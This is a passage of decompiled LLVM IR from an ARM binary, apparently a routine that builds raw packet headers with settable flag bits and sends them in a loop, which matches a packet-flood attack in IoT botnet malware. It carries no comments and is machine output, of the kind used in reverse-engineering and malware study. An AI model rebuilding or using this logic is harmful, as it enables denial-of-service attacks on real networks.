  %v4_bc60 = inttoptr i32 %v3_bc60 to i8*
  store i8 %v1_bc60, i8* %v4_bc60, align 1
  %v0_bc64 = load i32, i32* %lr.global-to-local, align 4
  %v2_bc64 = icmp eq i32 %v0_bc64, 0
  store i1 %v2_bc64, i1* %cpsr_z.global-to-local, align 1
  %v0_bc68 = load i32, i32* %r2.global-to-local, align 4
  %v3_bc68 = sdiv i32 %v0_bc68, 256
  store i32 %v3_bc68, i32* %r3.global-to-local, align 4
  store i32 %v4_bc6c, i32* %r2.global-to-local, align 4
  %v1_bc70 = trunc i32 %v3_bc68 to i8
  %v2_bc70 = load i32, i32* @r4, align 4
  %v3_bc70 = add i32 %v2_bc70, 3
  %v4_bc70 = inttoptr i32 %v3_bc70 to i8*
  store i8 %v1_bc70, i8* %v4_bc70, align 1
  %v0_bc74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bc74, label %bb77, label %bb76

bb76:                                             ; preds = %dec_label_pc_bb78
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb77

bb77:                                             ; preds = %dec_label_pc_bb78, %bb76
  %v0_bc78 = load i32, i32* %r2.global-to-local, align 4
  %v1_bc78 = trunc i32 %v0_bc78 to i8
  %v2_bc78 = load i32, i32* @r4, align 4
  %v3_bc78 = add i32 %v2_bc78, 8
  %v4_bc78 = inttoptr i32 %v3_bc78 to i8*
  store i8 %v1_bc78, i8* %v4_bc78, align 1
  %v0_bc7c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bc7c, label %.thread6, label %bb78

bb78:                                             ; preds = %bb77
  %v1_bc7c = load i32, i32* %r3.global-to-local, align 4
  %v2_bc7c = trunc i32 %v1_bc7c to i8
  %v3_bc7c = load i32, i32* @r4, align 4
  %v4_bc7c = add i32 %v3_bc7c, 6
  %v5_bc7c = inttoptr i32 %v4_bc7c to i8*
  store i8 %v2_bc7c, i8* %v5_bc7c, align 1
  %v0_bc80.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bc80.pr, label %.thread6, label %bb79

bb79:                                             ; preds = %bb78
  store i32 0, i32* %r2.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb77, %bb78, %bb79
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_bc88 = load i32, i32* @r4, align 4
  %v3_bc88 = add i32 %v2_bc88, 9
  %v4_bc88 = inttoptr i32 %v3_bc88 to i8*
  store i8 6, i8* %v4_bc88, align 1
  %v0_bc8c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bc8c, label %bb81, label %bb80

bb80:                                             ; preds = %.thread6
  %v1_bc8c = load i32, i32* %r2.global-to-local, align 4
  %v2_bc8c = trunc i32 %v1_bc8c to i8
  %v3_bc8c = load i32, i32* @r4, align 4
  %v4_bc8c = add i32 %v3_bc8c, 7
  %v5_bc8c = inttoptr i32 %v4_bc8c to i8*
  store i8 %v2_bc8c, i8* %v5_bc8c, align 1
  br label %bb81

bb81:                                             ; preds = %.thread6, %bb80
  %v2_bc94 = load i32, i32* @global_var_1ecb8.86, align 4
  store i32 %v2_bc94, i32* %r3.global-to-local, align 4
  %v0_bc98 = load i32, i32* %r0.global-to-local, align 4
  %v3_bc98 = sdiv i32 %v0_bc98, 256
  store i32 %v3_bc98, i32* %ip.global-to-local, align 4
  %v1_bc9c = load i32, i32* @r4, align 4
  %v2_bc9c = add i32 %v1_bc9c, 12
  %v3_bc9c = inttoptr i32 %v2_bc9c to i32*
  store i32 %v2_bc94, i32* %v3_bc9c, align 4
  %v0_bca0 = load i32, i32* %ip.global-to-local, align 4
  %v1_bca0 = trunc i32 %v0_bca0 to i8
  %v2_bca0 = load i32, i32* @r4, align 4
  %v3_bca0 = add i32 %v2_bca0, 5
  %v4_bca0 = inttoptr i32 %v3_bca0 to i8*
  store i8 %v1_bca0, i8* %v4_bca0, align 1
  %v3_bca4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bca4, i32* %r2.global-to-local, align 4
  store i32 %v2_b748, i32* %ip.global-to-local, align 4
  %v4_bcac = mul i32 %v3_bca4, 16
  %v5_bcac = add i32 %v4_bcac, %v2_b748
  %v6_bcac = inttoptr i32 %v5_bcac to i32*
  %v7_bcac = load i32, i32* %v6_bcac, align 4
  store i32 %v7_bcac, i32* %r3.global-to-local, align 4
  %v0_bcb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_bcb0 = trunc i32 %v0_bcb0 to i8
  %v2_bcb0 = load i32, i32* @r4, align 4
  %v3_bcb0 = add i32 %v2_bcb0, 4
  %v4_bcb0 = inttoptr i32 %v3_bcb0 to i8*
  store i8 %v1_bcb0, i8* %v4_bcb0, align 1
  %v0_bcb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_bcb4 = load i32, i32* @r4, align 4
  %v2_bcb4 = add i32 %v1_bcb4, 16
  %v3_bcb4 = inttoptr i32 %v2_bcb4 to i32*
  store i32 %v0_bcb4, i32* %v3_bcb4, align 4
  %v0_bcb8 = load i32, i32* %r2.global-to-local, align 4
  %v3_bcb8 = mul i32 %v0_bcb8, 16
  %v1_bcbc = load i32, i32* %ip.global-to-local, align 4
  %v2_bcbc = add i32 %v1_bcbc, %v3_bcb8
  store i32 %v2_bcbc, i32* %r2.global-to-local, align 4
  %v1_bcc0 = add i32 %v2_bcbc, 13
  %v2_bcc0 = inttoptr i32 %v1_bcc0 to i8*
  %v3_bcc0 = load i8, i8* %v2_bcc0, align 1
  %v4_bcc0 = zext i8 %v3_bcc0 to i32
  store i32 %v4_bcc0, i32* %r1.global-to-local, align 4
  %v1_bcc4 = add i32 %v2_bcbc, 12
  %v2_bcc4 = inttoptr i32 %v1_bcc4 to i8*
  %v3_bcc4 = load i8, i8* %v2_bcc4, align 1
  %v4_bcc4 = zext i8 %v3_bcc4 to i32
  %v4_bcc8 = mul nuw nsw i32 %v4_bcc0, 256
  %v5_bcc8 = or i32 %v4_bcc4, %v4_bcc8
  store i32 %v5_bcc8, i32* %r3.global-to-local, align 4
  %v2_bccc = load i32, i32* @r4, align 4
  %v3_bccc = add i32 %v2_bccc, 20
  %v4_bccc = inttoptr i32 %v3_bccc to i8*
  store i8 %v3_bcc4, i8* %v4_bccc, align 1
  %v0_bcd0 = load i32, i32* @r4, align 4
  %v1_bcd0 = add i32 %v0_bcd0, 20
  store i32 %v1_bcd0, i32* @r6, align 4
  %v0_bcd4 = load i32, i32* %r3.global-to-local, align 4
  %v3_bcd4 = sdiv i32 %v0_bcd4, 256
  store i32 %v3_bcd4, i32* %r3.global-to-local, align 4
  %v1_bcd8 = trunc i32 %v3_bcd4 to i8
  %v3_bcd8 = add i32 %v0_bcd0, 21
  %v4_bcd8 = inttoptr i32 %v3_bcd8 to i8*
  store i8 %v1_bcd8, i8* %v4_bcd8, align 1
  %v0_bcdc = load i32, i32* @r6, align 4
  %v1_bcdc = add i32 %v0_bcdc, 13
  %v2_bcdc = inttoptr i32 %v1_bcdc to i8*
  %v3_bcdc = load i8, i8* %v2_bcdc, align 1
  %v4_bcdc = zext i8 %v3_bcdc to i32
  store i32 %v4_bcdc, i32* %r3.global-to-local, align 4
  %v0_bce0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bce0 = add i32 %v0_bce0, 8
  %v2_bce0 = inttoptr i32 %v1_bce0 to i32*
  %v3_bce0 = load i32, i32* %v2_bce0, align 4
  store i32 %v3_bce0, i32* %r1.global-to-local, align 4
  %v1_bce4 = or i32 %v4_bcdc, 1
  store i32 %v1_bce4, i32* %r3.global-to-local, align 4
  %v1_bce8 = add i32 %v0_bce0, 15
  %v2_bce8 = inttoptr i32 %v1_bce8 to i8*
  %v3_bce8 = load i8, i8* %v2_bce8, align 1
  %v4_bce8 = zext i8 %v3_bce8 to i32
  store i32 %v4_bce8, i32* %ip.global-to-local, align 4
  %v1_bcec = add i32 %v0_bce0, 14
  %v2_bcec = inttoptr i32 %v1_bcec to i8*
  %v3_bcec = load i8, i8* %v2_bcec, align 1
  %v4_bcec = zext i8 %v3_bcec to i32
  store i32 %v4_bcec, i32* %r0.global-to-local, align 4
  %v2_bcf0 = add i32 %v0_bcdc, 4
  %v3_bcf0 = inttoptr i32 %v2_bcf0 to i32*
  store i32 %v3_bce0, i32* %v3_bcf0, align 4
  %v0_bcf4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bcf4 = add i32 %v0_bcf4, 4
  %v2_bcf4 = inttoptr i32 %v1_bcf4 to i32*
  %v3_bcf4 = load i32, i32* %v2_bcf4, align 4
  store i32 %v3_bcf4, i32* %lr.global-to-local, align 4
  %v0_bcf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_bcf8 = trunc i32 %v0_bcf8 to i8
  %v2_bcf8 = load i32, i32* @r6, align 4
  %v3_bcf8 = add i32 %v2_bcf8, 13
  %v4_bcf8 = inttoptr i32 %v3_bcf8 to i8*
  store i8 %v1_bcf8, i8* %v4_bcf8, align 1
  %v0_bcfc = load i32, i32* @r6, align 4
  %v1_bcfc = add i32 %v0_bcfc, 12
  %v2_bcfc = inttoptr i32 %v1_bcfc to i8*
  %v3_bcfc = load i8, i8* %v2_bcfc, align 1
  %v4_bcfc = zext i8 %v3_bcfc to i32
  store i32 %v4_bcfc, i32* %r2.global-to-local, align 4
  %v1_bd00 = add i32 %v0_bcfc, 13
  %v2_bd00 = inttoptr i32 %v1_bd00 to i8*
  %v3_bd00 = load i8, i8* %v2_bd00, align 1
  %v4_bd00 = zext i8 %v3_bd00 to i32
  %v0_bd04 = load i32, i32* %r0.global-to-local, align 4
  %v1_bd04 = load i32, i32* %ip.global-to-local, align 4
  %v4_bd04 = mul i32 %v1_bd04, 256
  %v5_bd04 = or i32 %v4_bd04, %v0_bd04
  store i32 %v5_bd04, i32* %r0.global-to-local, align 4
  %tmp101 = urem i8 %v3_bcfc, 16
  %v1_bd08 = zext i8 %tmp101 to i32
  %v3_bd0c = sdiv i32 %v5_bd04, 256
  store i32 %v3_bd0c, i32* %r1.global-to-local, align 4
  %v1_bd10 = or i32 %v1_bd08, 128
  store i32 %v1_bd10, i32* %r2.global-to-local, align 4
  %v1_bd14 = or i32 %v4_bd00, 16
  store i32 %v1_bd14, i32* %r3.global-to-local, align 4
  %v1_bd18 = trunc i32 %v3_bd0c to i8
  %v3_bd18 = add i32 %v0_bcfc, 3
  %v4_bd18 = inttoptr i32 %v3_bd18 to i8*
  store i8 %v1_bd18, i8* %v4_bd18, align 1
  %v0_bd1c = load i32, i32* %lr.global-to-local, align 4
  %v1_bd1c = load i32, i32* @r6, align 4
  %v2_bd1c = add i32 %v1_bd1c, 8
  %v3_bd1c = inttoptr i32 %v2_bd1c to i32*
  store i32 %v0_bd1c, i32* %v3_bd1c, align 4
  %v0_bd20 = load i32, i32* %r2.global-to-local, align 4
  %v1_bd20 = trunc i32 %v0_bd20 to i8
  %v2_bd20 = load i32, i32* @r6, align 4
  %v3_bd20 = add i32 %v2_bd20, 12
  %v4_bd20 = inttoptr i32 %v3_bd20 to i8*
  store i8 %v1_bd20, i8* %v4_bd20, align 1
  %v0_bd24 = load i32, i32* %r3.global-to-local, align 4
  %v1_bd24 = trunc i32 %v0_bd24 to i8
  %v2_bd24 = load i32, i32* @r6, align 4
  %v3_bd24 = add i32 %v2_bd24, 13
  %v4_bd24 = inttoptr i32 %v3_bd24 to i8*
  store i8 %v1_bd24, i8* %v4_bd24, align 1
  %v0_bd28 = load i32, i32* %r0.global-to-local, align 4
  %v1_bd28 = trunc i32 %v0_bd28 to i8
  %v2_bd28 = load i32, i32* @r6, align 4
  %v3_bd28 = add i32 %v2_bd28, 2
  %v4_bd28 = inttoptr i32 %v3_bd28 to i8*
  store i8 %v1_bd28, i8* %v4_bd28, align 1
  %v0_bd2c = call i32 @function_fe60()
  %v1_bd2c = trunc i32 %v0_bd2c to i8
  store i32 %v0_bd2c, i32* %r0.global-to-local, align 4
  store i32 %v1_b810, i32* %lr.global-to-local, align 4
  %v0_bd34 = load i32, i32* @r6, align 4
  %v1_bd34 = add i32 %v0_bd34, 13
  %v2_bd34 = inttoptr i32 %v1_bd34 to i8*
  %v3_bd34 = load i8, i8* %v2_bd34, align 1
  %v4_bd34 = zext i8 %v3_bd34 to i32
  store i32 %v1_bd38, i32* %r2.global-to-local, align 4
  %v1_bd3c = and i32 %v4_bd34, 223
  %v5_bd40 = or i32 %v1_bd3c, %v4_bd40
  store i32 %v5_bd40, i32* %r3.global-to-local, align 4
  %v1_bd44 = trunc i32 %v5_bd40 to i8
  store i8 %v1_bd44, i8* %v2_bd34, align 1
  store i32 %v1_b830, i32* %r1.global-to-local, align 4
  %v0_bd4c = load i32, i32* @r6, align 4
  %v1_bd4c = add i32 %v0_bd4c, 13
  %v2_bd4c = inttoptr i32 %v1_bd4c to i8*
  %v3_bd4c = load i8, i8* %v2_bd4c, align 1
  %v4_bd4c = zext i8 %v3_bd4c to i32
  store i32 %v1_bd50, i32* %r3.global-to-local, align 4
  %v1_bd54 = and i32 %v4_bd4c, 239
  %v5_bd58 = or i32 %v1_bd54, %v4_bd58
  store i32 %v5_bd58, i32* %r2.global-to-local, align 4
  %v1_bd5c = trunc i32 %v5_bd58 to i8
  store i8 %v1_bd5c, i8* %v2_bd4c, align 1
  store i32 %v1_b850, i32* %ip.global-to-local, align 4
  %v0_bd64 = load i32, i32* @r6, align 4
  %v1_bd64 = add i32 %v0_bd64, 13
  %v2_bd64 = inttoptr i32 %v1_bd64 to i8*
  %v3_bd64 = load i8, i8* %v2_bd64, align 1
  %v4_bd64 = zext i8 %v3_bd64 to i32
  store i32 %v1_bd68, i32* %r2.global-to-local, align 4
  %v1_bd6c = and i32 %v4_bd64, 247
  %v5_bd70 = or i32 %v1_bd6c, %v4_bd70
  store i32 %v5_bd70, i32* %r3.global-to-local, align 4
  %v1_bd74 = trunc i32 %v5_bd70 to i8
  store i8 %v1_bd74, i8* %v2_bd64, align 1
  %v0_bd7c = load i32, i32* @r6, align 4
  %v1_bd7c = add i32 %v0_bd7c, 13
  %v2_bd7c = inttoptr i32 %v1_bd7c to i8*
  %v3_bd7c = load i8, i8* %v2_bd7c, align 1
  %v4_bd7c = zext i8 %v3_bd7c to i32
  store i32 %v1_bd80, i32* %r3.global-to-local, align 4
  %v1_bd84 = and i32 %v4_bd7c, 251
  %v5_bd88 = or i32 %v1_bd84, %v4_bd88
  store i32 %v5_bd88, i32* %r2.global-to-local, align 4
  %v1_bd8c = trunc i32 %v5_bd88 to i8
  store i8 %v1_bd8c, i8* %v2_bd7c, align 1
  store i32 %v1_b890, i32* %r1.global-to-local, align 4
  %v0_bd94 = load i32, i32* @r6, align 4
  %v1_bd94 = add i32 %v0_bd94, 13
  %v2_bd94 = inttoptr i32 %v1_bd94 to i8*
  %v3_bd94 = load i8, i8* %v2_bd94, align 1
  %v4_bd94 = zext i8 %v3_bd94 to i32
  store i32 %v1_bd98, i32* %r2.global-to-local, align 4
  %v1_bd9c = and i32 %v4_bd94, 253
  %v4_bda0 = or i32 %v1_bd9c, %v3_bda0
  store i32 %v4_bda0, i32* %r3.global-to-local, align 4
  %v1_bda4 = trunc i32 %v4_bda0 to i8
  store i8 %v1_bda4, i8* %v2_bd94, align 1
  %v0_bda8 = load i32, i32* @r6, align 4
  %v1_bda8 = add i32 %v0_bda8, 13
  %v2_bda8 = inttoptr i32 %v1_bda8 to i8*
  %v3_bda8 = load i8, i8* %v2_bda8, align 1
  %v4_bda8 = zext i8 %v3_bda8 to i32
  %v0_bdac = load i32, i32* @r8, align 4
  %v1_bdac = urem i32 %v0_bdac, 2
  %v1_bdb0 = and i32 %v4_bda8, 254
  store i32 %v1_bdb0, i32* %r2.global-to-local, align 4
  %v4_bdb427 = udiv i32 %v0_bd2c, 256
  %v2_bdb8 = or i32 %v1_bdb0, %v1_bdac
  store i32 %v2_bdb8, i32* %r3.global-to-local, align 4
  %v1_bdbc = trunc i32 %v4_bdb427 to i8
  %v3_bdbc = add i32 %v0_bda8, 15
  %v4_bdbc = inttoptr i32 %v3_bdbc to i8*
  store i8 %v1_bdbc, i8* %v4_bdbc, align 1
  %v3_bdc0 = load i32, i32* @r6, align 4
  %v4_bdc0 = add i32 %v3_bdc0, 14
  %v5_bdc0 = inttoptr i32 %v4_bdc0 to i8*
  store i8 %v1_bd2c, i8* %v5_bdc0, align 1
  %v0_bdc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_bdc4 = trunc i32 %v0_bdc4 to i8
  %v2_bdc4 = load i32, i32* @r6, align 4
  %v3_bdc4 = add i32 %v2_bdc4, 13
  %v4_bdc4 = inttoptr i32 %v3_bdc4 to i8*
  store i8 %v1_bdc4, i8* %v4_bdc4, align 1
  %v0_bdc8 = load i32, i32* @r4, align 4
  %v1_bdc8 = add i32 %v0_bdc8, 40
  store i32 %v1_bdc8, i32* %r0.global-to-local, align 4
  %v0_bdcc = load i32, i32* @sb, align 4
  store i32 %v0_bdcc, i32* @r1, align 4
  %v1_bdd0 = inttoptr i32 %v1_bdc8 to i8*
  %v2_bdd0 = call i32 @function_1003c(i8* %v1_bdd0)
  store i32 %v2_bdd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bdd4

dec_label_pc_bdd4:                                ; preds = %dec_label_pc_b974, %bb81
  %v3_bdd4 = load i32, i32* %stack_var_-40, align 4
  %v1_bdd8 = add i32 %v3_bdd4, 1
  store i32 %v1_bdd8, i32* %r3.global-to-local, align 4
  %v1_bddc = load i32, i32* @fp, align 4
  %v9_bddc = icmp eq i32 %v1_bdd8, %v1_bddc
  store i1 %v9_bddc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bdd8, i32* %stack_var_-40, align 4
  %v5_bde4 = icmp slt i32 %v1_bdd8, %v1_bddc
  br i1 %v5_bde4, label %dec_label_pc_b964, label %dec_label_pc_bde8

dec_label_pc_bde8:                                ; preds = %dec_label_pc_bdd4, %.thread18
  %v0_bdf012 = phi i32 [ %v0_b938, %.thread18 ], [ %v1_bddc, %dec_label_pc_bdd4 ]
  %v0_bde8 = load i32, i32* @sb, align 4
  %v1_bde8 = add i32 %v0_bde8, 40
  store i32 %v1_bde8, i32* @sl, align 4
  %v1_bdec = add i32 %v0_bde8, 20
  store i32 %v1_bdec, i32* @r7, align 4
  %v2_be3c = icmp eq i32 %v1_b8e8, 0
  %v6_be1c = inttoptr i32 %v2_b758 to i32*
  %v3_be24 = icmp eq i32 %v3_b940, 65535
  br label %dec_label_pc_bdf0

dec_label_pc_bdf0:                                ; preds = %dec_label_pc_be4c, %dec_label_pc_bde8
  %v0_bdf0 = phi i32 [ %v1_bf2c, %dec_label_pc_be4c ], [ %v0_bdf012, %dec_label_pc_bde8 ]
  %v2_bdf0 = icmp eq i32 %v0_bdf0, 0
  store i1 %v2_bdf0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp82 = icmp slt i32 %v0_bdf0, 1
  br label %dec_label_pc_bdf8

dec_label_pc_bdf8:                                ; preds = %dec_label_pc_bdf8, %dec_label_pc_bdf0
  br i1 %tmp82, label %dec_label_pc_bdf8, label %dec_label_pc_bdfc

dec_label_pc_bdfc:                                ; preds = %dec_label_pc_bdf8
  %v0_bdfc = load i32, i32* @r7, align 4
  %tmp83 = mul i32 %v0_bdfc, 256
  %v1_be04 = and i32 %tmp83, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %tmp84 = udiv i32 %v0_bdfc, 256
  %v4_be08 = urem i32 %tmp84, 256
  %v5_be08 = or i32 %v4_be08, %v1_be04
  store i32 %v5_be08, i32* @r8, align 4
  store i32 %v2_b758, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_b940, i32* %ip.global-to-local, align 4
  %v7_be1c = load i32, i32* %v6_be1c, align 4
  store i32 %v7_be1c, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_be24, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* @r6, align 4
  %v1_be30 = add i32 %v7_be1c, 20
  store i32 %v1_be30, i32* @r5, align 4
  br i1 %v3_be24, label %dec_label_pc_bf58, label %dec_label_pc_be38

dec_label_pc_be38:                                ; preds = %dec_label_pc_bf38, %dec_label_pc_bdfc
  %v0_be40 = phi i32 [ %v7_bf44, %dec_label_pc_bf38 ], [ %v7_be1c, %dec_label_pc_bdfc ]
  store i32 %v1_b8e8, i32* %lr.global-to-local, align 4
  store i1 %v2_be3c, i1* %cpsr_z.global-to-local, align 1
  %v1_be40 = add i32 %v0_be40, 40
  store i32 %v1_be40, i32* %r0.global-to-local, align 4
  %v0_be44 = load i32, i32* @sb, align 4
  store i32 %v0_be44, i32* @r1, align 4
  br i1 %v2_be3c, label %dec_label_pc_be4c, label %dec_label_pc_bf7c

dec_label_pc_be4c:                                ; preds = %dec_label_pc_be38, %dec_label_pc_bf58, %dec_label_pc_bf7c
  %v2_be4c = phi i32 [ %v0_be40, %dec_label_pc_be38 ], [ %v0_bf70, %dec_label_pc_bf58 ], [ %v2_be4c.pre, %dec_label_pc_bf7c ]
  %v0_be4c = load i32, i32* @r6, align 4
  %v1_be4c = trunc i32 %v0_be4c to i8
  %v3_be4c = add i32 %v2_be4c, 10
  %v4_be4c = inttoptr i32 %v3_be4c to i8*
  store i8 %v1_be4c, i8* %v4_be4c, align 1
  %v0_be50 = load i32, i32* @r6, align 4
  %v1_be50 = trunc i32 %v0_be50 to i8
  %v2_be50 = load i32, i32* @r4, align 4
  %v3_be50 = add i32 %v2_be50, 11
  %v4_be50 = inttoptr i32 %v3_be50 to i8*
  store i8 %v1_be50, i8* %v4_be50, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_be58 = load i32, i32* @r4, align 4
  store i32 %v0_be58, i32* @r0, align 4
  %v2_be5c = call i32 @function_e424(i32 %v0_be58, i32 20)
  %v3_be5c = trunc i32 %v2_be5c to i8
  store i32 %v2_be5c, i32* %r0.global-to-local, align 4
  %v3_be60 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_b748, i32* %r2.global-to-local, align 4
  %v3_be68 = mul i32 %v3_be60, 16
  %v2_be6c = add i32 %v3_be68, %v2_b748
  store i32 %v2_be6c, i32* %r1.global-to-local, align 4
  %v1_be70 = add i32 %v2_be6c, 4
  %v2_be70 = inttoptr i32 %v1_be70 to i32*
  %v3_be70 = load i32, i32* %v2_be70, align 4
  %v3_be74 = mul i32 %v3_be70, 65536
  store i32 %v3_be74, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_be70, 256
  %v1_be7c = and i32 %tmp85, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %tmp86 = udiv i32 %v3_be70, 256
  %v4_be80 = urem i32 %tmp86, 256
  %v5_be80 = or i32 %v4_be80, %v1_be7c
  store i32 %v5_be80, i32* %r2.global-to-local, align 4
  %v1_be84 = add i32 %v3_be70, 1
  store i32 %v1_be84, i32* %r3.global-to-local, align 4
  store i32 %v1_be84, i32* %v2_be70, align 4
  %v0_be8c = load i32, i32* %r2.global-to-local, align 4
  %v1_be8c = load i32, i32* @r5, align 4
  %v2_be8c = add i32 %v1_be8c, 4
  %v3_be8c = inttoptr i32 %v2_be8c to i32*
  store i32 %v0_be8c, i32* %v3_be8c, align 4
  %v0_be90 = load i32, i32* %r1.global-to-local, align 4
  %v1_be90 = add i32 %v0_be90, 8
  %v2_be90 = inttoptr i32 %v1_be90 to i32*
  %v3_be90 = load i32, i32* %v2_be90, align 4
  %tmp87 = mul i32 %v3_be90, 256
  %v1_be9c = and i32 %tmp87, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %tmp88 = udiv i32 %v3_be90, 256
  %v4_bea0 = urem i32 %tmp88, 256
  %v5_bea0 = or i32 %v4_bea0, %v1_be9c
  store i32 %v5_bea0, i32* %r2.global-to-local, align 4
  %v4_bea428 = udiv i32 %v2_be5c, 256
  %v1_bea8 = trunc i32 %v4_bea428 to i8
  %v2_bea8 = load i32, i32* @r4, align 4
  %v3_bea8 = add i32 %v2_bea8, 11
  %v4_bea8 = inttoptr i32 %v3_bea8 to i8*
  store i8 %v1_bea8, i8* %v4_bea8, align 1
  %v3_beac = load i32, i32* @r4, align 4
  %v4_beac = add i32 %v3_beac, 10
  %v5_beac = inttoptr i32 %v4_beac to i8*
  store i8 %v3_be5c, i8* %v5_beac, align 1
  %v0_beb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_beb0 = load i32, i32* @r5, align 4
  %v2_beb0 = add i32 %v1_beb0, 8
  %v3_beb0 = inttoptr i32 %v2_beb0 to i32*
  store i32 %v0_beb0, i32* %v3_beb0, align 4
  %v0_beb4 = load i32, i32* @r5, align 4
  store i32 %v0_beb4, i32* @r1, align 4
  %v0_beb8 = load i32, i32* @r8, align 4
  store i32 %v0_beb8, i32* %r2.global-to-local, align 4
  %v0_bebc = load i32, i32* @r7, align 4
  store i32 %v0_bebc, i32* %r3.global-to-local, align 4
  %v0_bec0 = load i32, i32* @r4, align 4
  store i32 %v0_bec0, i32* %r0.global-to-local, align 4
  %v0_bec4 = load i32, i32* @r6, align 4
  %v1_bec4 = trunc i32 %v0_bec4 to i8
  %v3_bec4 = add i32 %v0_beb4, 16
  %v4_bec4 = inttoptr i32 %v3_bec4 to i8*
  store i8 %v1_bec4, i8* %v4_bec4, align 1
  %v0_bec8 = load i32, i32* @r6, align 4
  %v1_bec8 = trunc i32 %v0_bec8 to i8
  %v2_bec8 = load i32, i32* @r5, align 4
  %v3_bec8 = add i32 %v2_bec8, 17
  %v4_bec8 = inttoptr i32 %v3_bec8 to i8*
  store i8 %v1_bec8, i8* %v4_bec8, align 1
  %v4_becc = call i32 @function_e480(i32 %v0_bec0, i32 %v0_beb4, i32 %v0_beb8, i32 %v0_bebc)
  %v5_becc = trunc i32 %v4_becc to i8
  store i32 %v4_becc, i32* %r0.global-to-local, align 4
  %v4_bed029 = udiv i32 %v4_becc, 256
  %v1_bed4 = trunc i32 %v4_bed029 to i8
  %v2_bed4 = load i32, i32* @r5, align 4
  %v3_bed4 = add i32 %v2_bed4, 17
  %v4_bed4 = inttoptr i32 %v3_bed4 to i8*
  store i8 %v1_bed4, i8* %v4_bed4, align 1
  %v3_bed8 = load i32, i32* @r5, align 4
  %v4_bed8 = add i32 %v3_bed8, 16
  %v5_bed8 = inttoptr i32 %v4_bed8 to i8*
  store i8 %v5_becc, i8* %v5_bed8, align 1
  %v3_bedc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bedc, i32* %r3.global-to-local, align 4
  %v0_bee0 = load i32, i32* @r4, align 4
  %v1_bee0 = add i32 %v0_bee0, 20
  %v2_bee0 = inttoptr i32 %v1_bee0 to i32*
  %v3_bee0 = load i32, i32* %v2_bee0, align 4
  %v5_bee8 = mul i32 %v3_bedc, 24
  %v3_bef0 = udiv i32 %v3_bee0, 65536
  store i32 %v3_bef0, i32* %r2.global-to-local, align 4
  %v2_bef4 = add i32 %v5_bee8, %arg2
  store i32 %v2_bef4, i32* %ip.global-to-local, align 4
  %v3_bef84 = udiv i32 %v3_bee0, 16777216
  %v1_befc = trunc i32 %v3_bef84 to i8
  %v3_befc = add i32 %v2_bef4, 3
  %v4_befc = inttoptr i32 %v3_befc to i8*
  store i8 %v1_befc, i8* %v4_befc, align 1
  %v0_bf00 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf00 = trunc i32 %v0_bf00 to i8
  %v2_bf00 = load i32, i32* %ip.global-to-local, align 4
  %v3_bf00 = add i32 %v2_bf00, 2
  %v4_bf00 = inttoptr i32 %v3_bf00 to i8*
  store i8 %v1_bf00, i8* %v4_bf00, align 1
  %v0_bf04 = load i32, i32* @r4, align 4
  store i32 %v0_bf04, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_b8f8, i32* %r0.global-to-local, align 4
  %v0_bf10 = load i32, i32* @sl, align 4
  store i32 %v0_bf10, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_bf18 = load i32, i32* %ip.global-to-local, align 4
  %v6_bf20 = inttoptr i32 %v0_bf04 to i32*
  %v7_bf20 = call i32 @function_13f2c(i32 %v3_b8f8, i32* %v6_bf20, i32 %v0_bf10, i32 16384, i32 %v0_bf18, i32 16)
  %v3_bf24 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bf24, i32* %r3.global-to-local, align 4
  %v1_bf28 = add i32 %v3_bf24, 1
  store i32 %v1_bf28, i32* %r0.global-to-local, align 4
  %v1_bf2c = load i32, i32* @fp, align 4
  %v9_bf2c = icmp eq i32 %v1_bf28, %v1_bf2c
  store i1 %v9_bf2c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bf28, i32* %stack_var_-40, align 4
  %v6_bf34 = icmp slt i32 %v1_bf28, %v1_bf2c
  br i1 %v6_bf34, label %dec_label_pc_bf38, label %dec_label_pc_bdf0

dec_label_pc_bf38:                                ; preds = %dec_label_pc_be4c
  store i32 %v2_b758, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_b940, i32* %ip.global-to-local, align 4
  %v4_bf44 = mul i32 %v1_bf28, 4
  %v5_bf44 = add i32 %v4_bf44, %v2_b758
  %v6_bf44 = inttoptr i32 %v5_bf44 to i32*
  %v7_bf44 = load i32, i32* %v6_bf44, align 4
  store i32 %v7_bf44, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_be24, i1* %cpsr_z.global-to-local, align 1
  %v1_bf50 = add i32 %v7_bf44, 20
